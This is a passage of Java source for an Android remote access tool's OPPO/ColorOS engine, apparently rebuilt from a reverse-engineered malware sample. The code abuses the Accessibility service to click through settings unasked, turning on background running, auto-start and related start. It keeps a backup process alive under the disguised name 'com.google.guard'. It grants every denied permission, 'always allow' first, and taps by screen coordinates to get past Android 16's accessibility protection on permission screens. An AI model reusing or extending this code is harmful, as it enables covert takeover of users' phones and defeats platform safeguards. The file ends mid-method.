package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.util.GkdSelectorHelper;
import com.vendor.rat.auto.util.ScreenAdaptUtil;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * OPPO/ColorOS 厂商适配引擎 (模块 03)
 *
 * 基于逆向分析: o/v.java (526 行) — 完整对齐
 *
 * 核心特性:
 *   - 双进程保活: 主进程 + 备用进程 (com.google.guard)
 *   - 4种窗口检测: k0(App详情)/l0(耗电管理)/j0(对话框)/m0(自启动管理)
 *   - ConcurrentLinkedQueue 状态机
 *   - 配置驱动文本匹配 (COLORS_* 系列)
 *   - 3个开关: 完全允许后台(r0) / 自启动(s0) / 关联启动(t0)
 *
 * 监听的界面:
 *   - com.android.settings / InstalledAppDetailsTop (应用详情)
 *   - com.oplus.battery / PowerControlActivity (耗电管理)
 *   - com.oplus.battery / StartupAppListActivity (自启动管理)
 *   - com.coloros.oppoguardelf / PowerControlActivity (旧版)
 *   - 多种对话框 (androidx/coui/FrameLayout)
 *
 * 市场份额: ~18%
 */
public class OppoEngine extends AutoEngine {

    private static final String TAG = "OppoEngine";

    // ====== 包名 — 对应逆向 ======
    private static final String SETTINGS = "com.android.settings";
    private static final String OPLUS_BATTERY = "com.oplus.battery";
    private static final String GUARD_ELF = "com.coloros.oppoguardelf";
    private static final String SAFE_CENTER = "com.coloros.safecenter";  // ADAPT: kept for reference

    // ====== Activity — 对应逆向 ======
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String APP_DETAILS_ACTIVITY = INSTALLED_APP_DETAILS;
    private static final String STARTUP_LIST_ACTIVITY =
        "com.oplus.startupapp.view.StartupAppListActivity";
    private static final String ALERT_DIALOG = "android.app.AlertDialog";
    private static final String OPLUS_POWER_CONTROL =
        "com.oplus.powermanager.fuelgaue.PowerControlActivity";
    private static final String COLOROS_POWER_CONTROL =
        "com.coloros.powermanager.fuelgaue.PowerControlActivity";
    private static final String OPLUS_STARTUP_LIST =
        "com.oplus.startupapp.view.StartupAppListActivity";
    private static final String ANDROIDX_DIALOG = "androidx.appcompat.app.b";
    private static final String COUI_DIALOG = "com.coui.appcompat.dialog.app.a";

    // ====== 状态常量 — 对应逆向 ConcurrentLinkedQueue ======
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_POWER_CONTROL = "keepAliveInPowerControl";
    private static final String ST_DIALOG = "keepAliveInAndroidXDialog";
    private static final String ST_STARTUP = "keepAliveInStartup";

    // ====== 保活类型 — 对应逆向 r.e ======
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";

    // ====== 状态字段 — 对应逆向 f700r ~ f703u ======
    // ADAPT: r.e enum → String constants
    // 初始值设为 KA_MAIN — vendor d.java 启动 Runnable 在 k0() 之前设置
    private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_MAIN);
    private final AtomicBoolean allowFullBackground = new AtomicBoolean(false);  // f701s
    private final AtomicBoolean allowAutoStart = new AtomicBoolean(false);       // f702t
    private final AtomicBoolean allowRelateStart = new AtomicBoolean(false);     // f703u

    // ====== 窗口检测分组 ======
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> powerControlWins = new ArrayList<>();
    private final List<WindowMatcher> dialogWins = new ArrayList<>();

    private String appName; // ADAPT: vendor 从配置获取

    public OppoEngine() {
        super(buildAllMatchers(), SETTINGS);
        buildDetectionGroups();

        // 定时任务: 100秒 — 对应逆向 schedule(new u(this, 4), 100L, SECONDS)
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { finish(); }  // ADAPT: case 4 → Z()
            }, 100L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    // ============ 窗口检测分组 ============

    private void buildDetectionGroups() {
        // k0() 检测: App详情 — A0(appName)/v0(appName)
        appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS));
        appDetailWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout"));

        // l0() 检测: 耗电管理 — y0/x0/q0/p0
        powerControlWins.add(new WindowMatcher(OPLUS_BATTERY, OPLUS_POWER_CONTROL));
        powerControlWins.add(new WindowMatcher(OPLUS_BATTERY, "android.widget.FrameLayout"));
        powerControlWins.add(new WindowMatcher(GUARD_ELF, COLOROS_POWER_CONTROL));
        powerControlWins.add(new WindowMatcher(GUARD_ELF, "android.widget.FrameLayout"));

        // j0() 检测: 对话框 — g0/n0/h0/o0
        dialogWins.add(new WindowMatcher(OPLUS_BATTERY, ANDROIDX_DIALOG));
        dialogWins.add(new WindowMatcher(OPLUS_BATTERY, COUI_DIALOG));
        dialogWins.add(new WindowMatcher(OPLUS_BATTERY, null));  // h0(): className=null
        dialogWins.add(new WindowMatcher(GUARD_ELF, null));      // o0(): className=null
    }

    /**
     * 构建全部窗口匹配列表
     * 对应逆向: v.w0() — 12 个 ListenWindow
     */
    private static List<WindowMatcher> buildAllMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // c.J() — 通用 Dialog
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));

        // A0(appName) — 应用详情 InstalledAppDetailsTop + text match
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // A0(backupAppName)
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));

        // v0(appName) — FrameLayout + text match
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // v0(backupAppName)
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));

        // y0() — oplus PowerControlActivity
        list.add(new WindowMatcher(OPLUS_BATTERY, OPLUS_POWER_CONTROL)
            .addEventType(32).addEventType(16384));

        // q0() — coloros PowerControlActivity
        list.add(new WindowMatcher(GUARD_ELF, COLOROS_POWER_CONTROL)
            .addEventType(32).addEventType(16384));

        // g0() — oplus androidx dialog
        list.add(new WindowMatcher(OPLUS_BATTERY, ANDROIDX_DIALOG)
            .addEventType(32).addEventType(16384));

        // n0() — oplus coui dialog
        list.add(new WindowMatcher(OPLUS_BATTERY, COUI_DIALOG)
            .addEventType(32).addEventType(16384));

        // h0() — oplus battery null className
        list.add(new WindowMatcher(OPLUS_BATTERY)
            .addEventType(32).addEventType(16384));

        // o0() — coloros guardelf null className
        list.add(new WindowMatcher(GUARD_ELF)
            .addEventType(32).addEventType(16384));

        // z0() — oplus StartupAppListActivity
        list.add(new WindowMatcher(OPLUS_BATTERY, OPLUS_STARTUP_LIST)
            .addEventType(32).addEventType(16384));

        return list;
    }

    // ============ 窗口检测 — 对应逆向 k0/l0/j0/m0 ============
    // 对齐 vendor: 每个检测方法不仅匹配 package/class，
    // 还验证 UI 中存在特定文本 (matchs 条件)

    /**
     * 对应逆向: k0() — App详情窗口
     * vendor matchs: A0/v0 → H(appName) 验证目标应用名可见
     */
    private boolean k0() {
        if (!matchesAny(appDetailWins)) return false;
        UiNode root = k();
        if (root == null) return false;
        String targetName = Objects.equals(keepAliveType.get(), KA_MAIN)
            ? getAppName() : getBackupAppName();
        return GkdSelectorHelper.findOne(root, "TextView[text*=\"" + GkdSelectorHelper.escapeForSelector(targetName) + "\"]") != null;
    }

    /**
     * 对应逆向: l0() — 耗电管理窗口
     * vendor matchs: x0/p0 (FrameLayout) → i0() 验证后台运行文本
     * y0/q0 (Activity) 无 matchs
     */
    private boolean l0() {
        if (!matchesAny(powerControlWins)) return false;
        if (currentClassName != null && currentClassName.contains("FrameLayout")) {
            UiNode root = k();
            if (root == null) return false;
            String text = getConfigText("COLORS_APP_IN_BACKGROUND_TEXT");
            return text == null || GkdSelectorHelper.findOne(root, "TextView[text*=\"" + GkdSelectorHelper.escapeForSelector(text) + "\"]") != null;
        }
        return true;
    }

    /**
     * 对应逆向: j0() — 对话框窗口
     * vendor matchs: g0/n0/h0/o0 → d0() 验证允许按钮可见
     */
    private boolean j0() {
        if (!matchesAny(dialogWins)) return false;
        UiNode root = k();
        if (root == null) return false;
        String text = getConfigText("COLORS_SETTINGS_ALLOW_BUTTON_TEXT");
        return text == null || GkdSelectorHelper.findOne(root, "Button[text=\"" + GkdSelectorHelper.escapeForSelector(text) + "\"]") != null;
    }

    /** 对应逆向: m0() — 自启动管理窗口 (z0 无 matchs) */
    private boolean m0() {
        return matchesAny(Collections.singletonList(
            new WindowMatcher(OPLUS_BATTERY, OPLUS_STARTUP_LIST)));
    }

    // ============ 事件处理 — 对齐逆向 u() ============

    /**
     * 对应逆向: v.u(AccessibilityEvent, String, String)
     * ConcurrentLinkedQueue 状态机 + Runnable 分发
     */
    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        // vendor u():445-446 — super.u() 电池优化对话框
        if (event != null) {
            checkBatteryOptimizationDialog();
        }

        boolean inAppDetail = k0();

        if (inAppDetail) {
            // case 0: 查找并点击耗电管理栏目
            dispatchState(ST_APP_DETAIL, this::handleAppDetailState,
                ST_POWER_CONTROL, ST_DIALOG, ST_STARTUP);
        }
        if (l0()) {
            // case 1: 耗电管理 — 自启动/关联启动/完全后台
            dispatchState(ST_POWER_CONTROL, this::handlePowerControlState,
                ST_APP_DETAIL, ST_DIALOG, ST_STARTUP);
        }
        if (j0()) {
            // case 2: 对话框 — 点击允许按钮
            dispatchState(ST_DIALOG, this::handleDialogState,
                ST_APP_DETAIL, ST_POWER_CONTROL, ST_STARTUP);
        }
        if (m0()) {
            // case 3: 自启动管理
            dispatchState(ST_STARTUP, this::handleStartupState,
                ST_APP_DETAIL, ST_POWER_CONTROL, ST_DIALOG);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onAccessibilityEvent 处理
    }

    @Override
    public void execute() {
        // ADAPT: vendor 通过外部启动 App 详情页触发
        // 对应逆向: 由 EngineManager 启动应用详情
    }

    // ============ 状态处理 — 对应逆向 u(Runnable) case 0~3 ============

    /**
     * case 0: App详情 — 查找并点击耗电管理栏目
     * 对应逆向: u.run() case 0
     */
    private void handleAppDetailState() {
        if (!k0()) return;
        Log.d(TAG, "keepAliveInAppDetail 窗口匹配");
        updateProgress(10);
        activateRoot();
        Log.d(TAG, "active root complete");

        UiNode root = k();
        if (root == null) return;

        String text1 = getConfigText("COLORS_SETTINGS_POWER_MANAGE_TEXT");
        String text2 = getConfigText("COLORS_SETTINGS_POWER_MANAGE_2_TEXT");
        UiNode target = null;

        if (text1 != null) {
            target = GkdSelectorHelper.findOne(root, "TextView[text=\"" + GkdSelectorHelper.escapeForSelector(text1) + "\"]");
        }
        if (target == null && text2 != null) {
            target = GkdSelectorHelper.findOne(root, "TextView[text=\"" + GkdSelectorHelper.escapeForSelector(text2) + "\"]");
        }

        if (target != null && target.click()) {
            Log.d(TAG, "查找并点击耗电管理栏目成功");
            updateProgress(30);
        } else {
            Log.e(TAG, "查找并点击耗电管理栏目失败");
        }
    }

    /**
     * case 1: 耗电管理 — 自启动/关联启动/完全后台
     * 对应逆向: u.run() case 1
     *
     * ColorOS 16 适配: 自启动和关联启动已从耗电管理页移除，
     * 失败不阻塞流程。无论开关操作是否成功，都调用 handleCompletion()。
     */
    private void handlePowerControlState() {
        if (!l0()) return;
        Log.d(TAG, "keepAliveInPowerControl 窗口匹配");
        updateProgress(40);
        // 等待 UI 渲染 — 从 App 详情点击"耗电管理"后页面切换需要时间
        sleep(1500);
        activateRoot();
        Log.d(TAG, "active root complete");

        // s0(): 允许自启动 — ColorOS 16 已移除，失败不阻塞
        if (!handleAutoStartSwitch()) {
            Log.w(TAG, "允许自启动栏目不存在或操作失败 (ColorOS 16 可能已移除)");
        }
        updateProgress(50);

        // t0(): 允许关联启动 — ColorOS 16 已移除，失败不阻塞
        if (!handleRelateStartSwitch()) {
            Log.w(TAG, "允许关联启动栏目不存在或操作失败 (ColorOS 16 可能已移除)");
        }
        updateProgress(60);

        // r0(): 完全允许后台
        if (!handleFullBackgroundSwitch()) {
            Log.w(TAG, "完全允许后台操作失败，仍继续后续流程");
        }
        updateProgress(70);

        // ColorOS 16 适配: 无论开关操作是否成功，都继续完成流程
        handleCompletion();
    }

    /**
     * case 2: 对话框 — 点击允许按钮
     * 对应逆向: u.run() case 2
     */
    private void handleDialogState() {
        if (!j0()) return;
        Log.d(TAG, "checkInAndroidXDialog 窗口匹配");
        updateProgress(80);
        activateRoot();
        Log.d(TAG, "active root complete");

        UiNode root = k();
        if (root == null) return;

        String text = getConfigText("COLORS_SETTINGS_ALLOW_BUTTON_TEXT");
        UiNode btn = text != null ? GkdSelectorHelper.findOne(root, "Button[text=\"" + GkdSelectorHelper.escapeForSelector(text) + "\"]") : null;
        if (btn != null && btn.click()) {
            Log.d(TAG, "查找并点击允许确认按钮完成");
            updateProgress(90);
        } else {
            Log.e(TAG, "查找并点击允许确认按钮失败");
        }
    }

    /**
     * case 3: 自启动管理
     * 对应逆向: u.run() case 3 行 132-163
     * vendor: Q().scrollForwardUtil(CombineFilterWithChild(K(), H(name))) → R(row, 5)
     */
    private void handleStartupState() {
        if (!m0()) return;
        activateRoot();
        Log.d(TAG, "active root complete");

        String targetName = Objects.equals(keepAliveType.get(), KA_MAIN)
            ? getAppName() : getBackupAppName();
        Log.d(TAG, "keepAliveInStartup 窗口匹配");

        UiNode root = k();
        if (root == null) return;

        UiNode row = GkdSelectorHelper.findOne(root,
            "[clickable=true] > TextView[text*=\"" + GkdSelectorHelper.escapeForSelector(targetName) + "\"]");

        if (row != null) {
            CheckedResult result = R(row, 5);
            if (result.isClicked()) {
                Log.d(TAG, "已点击自启动");
            }
            if (result.isChecked()) {
                Log.d(TAG, "已勾选自启动");
                allowAutoStart.set(true);
            } else {
                Log.e(TAG, "未勾选自启动");
            }
        }
    }

    // ============ 开关操作 — 对应逆向 r0/s0/t0 ============

    /**
     * 查找包含指定文本的 clickable 行
     */
    private UiNode findRowWithText(String text) {
        UiNode root = k();
        if (root == null || text == null) return null;
        return GkdSelectorHelper.findOne(root, "[clickable=true] > TextView[text=\"" + GkdSelectorHelper.escapeForSelector(text) + "\"]");
    }

    /**
     * 完全允许后台行为
     * 对应逆向: v.r0() 行 351-383
     *
     * ColorOS 16 适配:
     *   - 旧版: Switch 模式 → R(row, 0) 坐标点击 Switch
     *   - ColorOS 16: RadioButton 模式 → 直接点击行 → 可能弹对话框/可能直接选中
     */
    private boolean handleFullBackgroundSwitch() {
        try {
            String text1 = getConfigText("COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT");
            String text2 = getConfigText("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT");
            UiNode row = text1 != null ? findRowWithText(text1) : null;
            if (row == null && text2 != null) {
                row = findRowWithText(text2);
            }
            if (row == null) {
                Log.e(TAG, "完全允许后台行为栏目查找失败");
                return false;
            }

            Log.d(TAG, "完全允许后台行为栏目查找成功");

            // ====== 尝试 1: Switch 模式 (旧版 ColorOS) ======
            CheckedResult result = R(row, 0);
            if (result.isClicked()) {
                Log.d(TAG, "已点击完全允许后台行为 (Switch 模式)");
            }
            if (result.isChecked()) {
                Log.d(TAG, "已勾选完全允许后台行为 (Switch 模式)");
                T0(10);
                if (!j0()) {
                    allowFullBackground.set(true);
                    return true;
                }
                return false;
            }

            // ====== 尝试 2: RadioButton 模式 (ColorOS 16) ======
            Log.d(TAG, "Switch 未找到，尝试 RadioButton 模式");
            row.click();
            sleep(2000);
            activateRoot();
            UiNode dialogRoot = k();

            if (dialogRoot == null) {
                // 无法获取 root — 假设点击成功
                Log.d(TAG, "RadioButton 模式: root 为 null，假设点击成功");
                allowFullBackground.set(true);
                return true;
            }

            // 检查是否弹出确认对话框
            UiNode allowBtn = GkdSelectorHelper.findOne(dialogRoot, "[id$=\"button1\"]");
            if (allowBtn != null && allowBtn.isClickable()) {
                allowBtn.click();
                Log.d(TAG, "已点击确认对话框'允许'按钮 (android:id/button1)");
                sleep(1000);
                allowFullBackground.set(true);
                return true;
            }

            // 没有对话框 — 检查文本匹配确认 fallback
            String btnText = getConfigText("COLORS_SETTINGS_ALLOW_BUTTON_TEXT");
            if (btnText != null) {
                UiNode textBtn = GkdSelectorHelper.findOne(dialogRoot,
                    "Button[text=\"" + GkdSelectorHelper.escapeForSelector(btnText) + "\"]");
                if (textBtn != null) {
                    textBtn.click();
                    Log.d(TAG, "已点击确认对话框'允许'按钮 (文本匹配)");
                    sleep(1000);
                    allowFullBackground.set(true);
                    return true;
                }
            }

            // 没有对话框 = RadioButton 直接选中 (ColorOS 16 行为)
            // 验证选中状态: 查找已选中的 "完全允许后台行为" RadioButton
            UiNode checkedRadio = GkdSelectorHelper.findOne(dialogRoot,
                "RadioButton[checked=true]");
            if (checkedRadio != null) {
                Log.d(TAG, "RadioButton 已选中 (完全允许后台行为)");
                allowFullBackground.set(true);
                return true;
            }

            // 最终 fallback: RadioButton 点击后无法验证状态，假设成功
            Log.d(TAG, "RadioButton 点击后无法验证状态，假设成功");
            allowFullBackground.set(true);
            return true;
        } catch (Exception e) {
            logError("handleFullBackgroundSwitch", e);
            return false;
        }
    }

    /**
     * 允许自启动
     * 对应逆向: v.s0() 行 385-410
     * vendor: findOneByCombineWithChild(K(), c0()) → R(row, 5)
     */
    private boolean handleAutoStartSwitch() {
        try {
            String text = getConfigText("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT");
            UiNode row = text != null ? findRowWithText(text) : null;
            if (row != null) {
                Log.d(TAG, "自启动栏目查找成功");
                CheckedResult result = R(row, 5);
                if (result.isClicked()) {
                    Log.d(TAG, "已点击允许自启动");
                }
                if (result.isChecked()) {
                    Log.d(TAG, "已勾选允许自启动");
                    allowAutoStart.set(true);
                    return true;
                }
                Log.e(TAG, "未勾选允许自启动");
                allowAutoStart.set(false);
            } else {
                Log.e(TAG, "允许自启动栏目查找失败");
            }
        } catch (Exception e) {
            logError("handleAutoStartSwitch", e);
        }
        return false;
    }

    /**
     * 允许关联启动
     * 对应逆向: v.t0() 行 412-437
     * vendor: findOneByCombineWithChild(K(), f0()) → R(row, 5)
     */
    private boolean handleRelateStartSwitch() {
        try {
            String text = getConfigText("COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT");
            UiNode row = text != null ? findRowWithText(text) : null;
            if (row != null) {
                Log.d(TAG, "关联启动栏目查找成功");
                CheckedResult result = R(row, 5);
                if (result.isClicked()) {
                    Log.d(TAG, "已点击允许关联启动");
                }
                if (result.isChecked()) {
                    Log.d(TAG, "已勾选允许关联启动");
                    allowRelateStart.set(true);
                    return true;
                }
                Log.e(TAG, "未勾选允许关联启动");
            } else {
                Log.e(TAG, "关联启动栏目查找失败");
            }
            return false;
        } catch (Exception e) {
            logError("handleRelateStartSwitch", e);
            return false;
        }
    }

    // ============ 状态保存 — 对应逆向 D0() ============

    /**
     * 保存保活策略
     * 对应逆向: v.D0(String packageName)
     */
    private void saveKeepAliveState(String packageName) {
        try {
            // ADAPT: vendor 使用 PowerControlStateVO + utils.h.k/L
            // 这里记录状态日志
            Log.d(TAG, packageName + " 进程保活策略已保存"
                + " fullBg=" + allowFullBackground.get()
                + " autoStart=" + allowAutoStart.get()
                + " relateStart=" + allowRelateStart.get());
        } catch (Exception e) {
            logError("saveKeepAliveState", e);
        }
    }

    // ============ 完成处理 — 对应逆向 u0() ============

    /**
     * 对应逆向: v.u0() 行 493-526
     * 主进程完成后切换到备用进程，或结束引擎
     *
     * vendor 逻辑:
     *   1. 保存主进程状态
     *   2. 清空所有标志
     *   3. 检查备用进程: 已完成(h.r) 或 未安装(g.d0==null) → 直接 Z()
     *   4. 否则切换到备用进程
     */
    private void handleCompletion() {
        try {
            // ColorOS 16 适配: 不再以 allowFullBackground 作为门控
            // 即使后台行为设置失败，也继续执行权限管理
            if (!allowFullBackground.get()) {
                Log.w(TAG, "后台行为未成功设置，但继续执行权限管理");
            }

            String type = keepAliveType.get();
            if (KA_MAIN.equals(type)) {
                saveKeepAliveState(getAppName());
                stateQueue.clear();
                allowFullBackground.set(false);
                allowAutoStart.set(false);
                allowRelateStart.set(false);
                if (isKeepAliveCompleted("com.google.guard")
                        || !isBackupAppInstalled("com.google.guard")) {
                    // 修复 Bug 3: 延迟 finish，确保权限授权有足够时间
                    handlePermissionManagement();
                    // 额外等待确认权限页面已关闭
                    sleep(2000);
                    activateRoot();
                    UiNode root = k();
                    // 验证已不在权限管理页面（应该回到了应用详情）
                    if (root != null) {
                        String pkg = root.getPackageName();
                        if (pkg != null && pkg.contains("securitypermission")) {
                            // 还在权限页面 → 执行 back 回到应用详情
                            Log.d(TAG, "权限管理完成但仍在权限页面，执行 back");
                            performBack();
                            sleep(1000);
                        }
                    }
                    finish();
                    return;
                }
                keepAliveType.set(KA_BACKUP);
                startSilent(SETTINGS, INSTALLED_APP_DETAILS);
                Log.d(TAG, "已启动 com.google.guard 应用详情");
            } else if (KA_BACKUP.equals(type)) {
                saveKeepAliveState("com.google.guard");
                // 修复 Bug 3: KA_BACKUP 分支同样需要延迟 finish
                handlePermissionManagement();
                sleep(2000);
                activateRoot();
                UiNode root = k();
                if (root != null) {
                    String pkg = root.getPackageName();
                    if (pkg != null && pkg.contains("securitypermission")) {
                        Log.d(TAG, "权限管理完成但仍在权限页面，执行 back");
                        performBack();
                        sleep(1000);
                    }
                }
                finish();
            }
        } catch (Exception e) {
            logError("handleCompletion", e);
        }
    }

    /**
     * 检查指定包名的保活策略是否已完成
     * 对应逆向: com.guard.wallet.utils.h.r(String) — 检查 PowerControlStateVO
     */
    private boolean isKeepAliveCompleted(String packageName) {
        // ADAPT: vendor 使用 SharedPreferences 存储 PowerControlStateVO
        // replica 暂时返回 false (总是尝试), 后续可接入状态持久化
        return false;
    }

    // ============ 权限管理自动化 ============

    /**
     * 电池优化完成后，返回应用详情页 → 进入权限管理 → 逐个授权
     *
     * 流程: 应用详情 → 电池优化(已完成) → 返回应用详情 → 权限管理 → 自动授权 → 返回
     * 包名: com.oplus.securitypermission (普通 OPPO 应用，无障碍正常工作)
     *
     * 允许选项优先级: 始终允许 > 使用时允许 > 允许
     */
    private static final String[] ALLOW_PRIORITY = {"始终允许", "使用时允许", "允许"};
    private static final String[] SKIP_PERMISSIONS = {"创建桌面快捷方式", "读取应用列表"};

    private void handlePermissionManagement() {
        Log.d(TAG, "开始权限管理自动化");
        updateProgress(75);

        // 修复 Bug 2: 先检测当前页面，避免盲目 performBack
        // 可能已经在应用详情页（对话框 handler 已经 back 过了）
        activateRoot();
        UiNode root = k();

        boolean inAppDetail = false;
        if (root != null) {
            // 检查是否在应用详情页 — 特征: 有"权限管理"入口
            UiNode permItem = GkdSelectorHelper.findOne(root, "TextView[text*=\"权限管理\"]");
            if (permItem != null) {
                inAppDetail = true;
            }
        }

        if (!inAppDetail) {
            // 不在应用详情 → 需要 back
            Log.d(TAG, "权限管理: 不在应用详情页，执行 back");
            performBack();
            sleep(2000);
            activateRoot();
            root = k();
        } else {
            Log.d(TAG, "权限管理: 已在应用详情页，跳过 back");
        }

        if (root == null) {
            Log.e(TAG, "权限管理: root is null");
            return;
        }

        // 重新查找权限管理入口（back 后 root 可能已变化）
        UiNode permEntry = GkdSelectorHelper.findOne(root, "TextView[text*=\"权限管理\"]");
        if (permEntry == null) {
            Log.e(TAG, "权限管理: 未找到'权限管理'入口");
            return;
        }

        permEntry.click();
        Log.d(TAG, "权限管理: 已点击'权限管理'");
        sleep(2000);

        // 3. 在权限列表中逐个处理"不允许"的权限
        int granted = 0;
        for (int round = 0; round < 15; round++) {
            activateRoot();
            root = k();
            if (root == null) break;

            UiNode deniedRow = findNextDeniedPermissionRow(root);
            if (deniedRow == null) {
                UiNode scroll = getScrollableNode();
                if (scroll != null && scroll.scrollForward()) {
                    sleep(500);
                    activateRoot();
                    root = k();
                    if (root != null) {
                        deniedRow = findNextDeniedPermissionRow(root);
                    }
                }
                if (deniedRow == null) {
                    Log.d(TAG, "权限管理: 无更多需要授权的权限");
                    break;
                }
            }

            deniedRow.click();
            sleep(1500);
            activateRoot();

            if (selectBestAllowOption()) {
                granted++;
                Log.d(TAG, "权限管理: 已授权第 " + granted + " 个权限");
            }

            performBack();
            sleep(1000);
            updateProgress(75 + Math.min(granted * 2, 20));
        }

        Log.d(TAG, "权限管理自动化完成: granted=" + granted);
        updateProgress(95);

        performBack();
        sleep(500);
    }

    /**
     * 在权限列表中查找下一个"不允许"状态的可处理权限行
     */
    private UiNode findNextDeniedPermissionRow(UiNode root) {
        List<UiNode> deniedTexts = GkdSelectorHelper.findAll(root, "TextView[text=\"不允许\"]");
        if (deniedTexts == null) return null;

        for (UiNode deniedText : deniedTexts) {
            UiNode row = deniedText.findClickableParent();
            if (row == null) continue;

            String permName = extractPermName(row);
            if (permName == null) continue;

            boolean skip = false;
            for (String s : SKIP_PERMISSIONS) {
                if (s.equals(permName)) { skip = true; break; }
            }
            if (skip) {
                Log.d(TAG, "权限管理: 跳过 " + permName);
                continue;
            }

            Log.d(TAG, "权限管理: 找到待授权权限 → " + permName);
            return row;
        }
        return null;
    }

    /**
     * 从权限行中提取权限名称 (排除状态文本)
     */
    private String extractPermName(UiNode row) {
        List<UiNode> tvs = GkdSelectorHelper.findAll(row, "TextView");
        if (tvs == null) return null;
        for (UiNode tv : tvs) {
            String text = tv.getText();
            if (text != null && !text.isEmpty()
                    && !"不允许".equals(text) && !"允许".equals(text)
                    && !"使用时允许".equals(text) && !"始终允许".equals(text)
                    && !"仅开屏时不允许".equals(text) && !"每次使用时询问".equals(text)) {
                return text;
            }
        }
        return null;
    }

    /**
     * 在权限子页面选择最高优先级的允许选项
     */
    private boolean selectBestAllowOption() {
        UiNode root = k();
        if (root == null) {
            Log.d(TAG, "权限管理: root is null, 尝试坐标点击 (PermissionController)");
            return clickAllowByCoordinate();
        }

        String pkg = root.getPackageName();
        if (pkg != null && (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller"))) {
            Log.d(TAG, "权限管理: PermissionController 页面, 用坐标点击");
            return clickAllowByCoordinate();
        }

        for (String allowText : ALLOW_PRIORITY) {
            UiNode row = GkdSelectorHelper.findOne(root,
                "[clickable=true] > TextView[text=\"" + GkdSelectorHelper.escapeForSelector(allowText) + "\"]");
            if (row != null) {
                row.click();
                Log.d(TAG, "权限管理: 已选择'" + allowText + "'");
                sleep(500);
                return true;
            }
        }
        Log.w(TAG, "权限管理: 未找到允许选项");
        return false;
    }

    /**
     * PermissionController 子页面坐标点击 (自适应分辨率)
     *
     * Android 16 的 PermissionController 使用 accessibilityDataSensitive,
     * 无障碍服务无法获取节点树。使用坐标点击作为 fallback。
     *
     * 基准设备: OPPO Find X6, 1240x2772
     * "始终允许" 按钮 center(550, 1052)
     *
     * 策略: 按屏幕比例缩放坐标，点击第一个允许选项
     */
    private boolean clickAllowByCoordinate() {
        try {
            android.util.DisplayMetrics dm = getContext().getResources().getDisplayMetrics();
            int screenWidth = dm.widthPixels;
            int screenHeight = dm.heightPixels;

            int[] coord = ScreenAdaptUtil.getPermissionAllowCoordinate(screenWidth, screenHeight);
            Log.d(TAG, "权限管理: 坐标点击 (" + coord[0] + ", " + coord[1]
                + ") 屏幕=" + screenWidth + "x" + screenHeight);

            boolean result = com.vendor.rat.utils.MiscUtils.tapAtCoordinate(coord[0], coord[1]);
            if (result) {
                Log.d(TAG, "权限管理: 坐标点击成功");
                sleep(1000);
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "clickAllowByCoordinate failed", e);
            return false;
        }
    }

    // ============ 结束引擎 — 对应逆向 Z() 行 243-283 ============

    /**
     * 对应逆向: v.Z() — OPPO 特化版本
     *
     * vendor Z() 与 base Z() 的差异:
     *   1. 保存状态基于 keepAliveType (main/backup)
     *   2. T0(5) 仅在 debug 模式下执行
     *   3. removeBlackScreen 有条件 (retryCount > 0 || isStrategyMode)
     *   4. 否则进入 PIP 模式 (PREPARE_LEAVE_PIP)
     *
     * 实现: 覆盖 finish() 做 OPPO 特有的状态保存,
     * 然后委托给 base Z() 处理通用清理流程
     */
    @Override
    public void finish() {
        // OPPO 特有: 根据 keepAliveType 保存对应包名的保活状态
        // vendor Z():255-261
        if (KA_MAIN.equals(keepAliveType.get())) {
            saveKeepAliveState(getAppName());
        }
        if (KA_BACKUP.equals(keepAliveType.get())) {
            saveKeepAliveState("com.google.guard");
        }
        // vendor Z():275 — c.W() 策略通知 (OPPO 用 PREPARE_FOR_APP_CONFIRM_LOCK)
        // base Z() 已包含此通知
        super.finish();
    }

    // ============ 工具方法 ============

    private String getAppName() {
        if (appName != null) return appName;
        // vendor g.x0(): 获取应用显示名 (非包名)
        // UI 上显示的是 app label (如 "System Service"), 不是包名
        try {
            android.content.Context ctx = getContext();
            if (ctx != null) {
                android.content.pm.PackageManager pm = ctx.getPackageManager();
                android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(ctx.getPackageName(), 0);
                String label = pm.getApplicationLabel(ai).toString();
                if (label != null && !label.isEmpty()) return label;
            }
        } catch (Exception ignored) {}
